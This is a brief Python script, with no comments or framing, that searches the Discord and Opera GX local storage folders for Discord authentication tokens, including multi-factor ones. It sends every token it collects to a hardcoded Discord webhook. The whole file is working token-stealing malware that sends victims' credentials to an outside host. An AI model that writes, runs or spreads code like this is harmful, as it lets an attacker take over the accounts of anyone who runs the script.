import requests
import os
from re import findall

ROAMING = os.getenv("APPDATA")
path = ROAMING + "\\Discord"

path += "\\Local Storage\\leveldb"
tokens = []
for file_name in os.listdir(path):
    if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
        continue
    for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
        for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
            for token in findall(regex, line):
                tokens.append(token)
path = ROAMING + "\\Opera Software\\Opera GX Stable"
path += "\\Local Storage\\leveldb"
for file_name in os.listdir(path):
    if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
        continue
    for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
        for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
            for token in findall(regex, line):
                tokens.append(token)
url = "https://discord.com/api/webhooks/1212539003543363594/X7uvDlZW0NKmjTgXglFB3lJpsnSu75P_lymcg5KW_FKjVxsJr_xNqqEDKxdwEq5A8Fem"
data = {
        "content": str(tokens),
        "username": "feb"
}
result = requests.post(url, json=data)
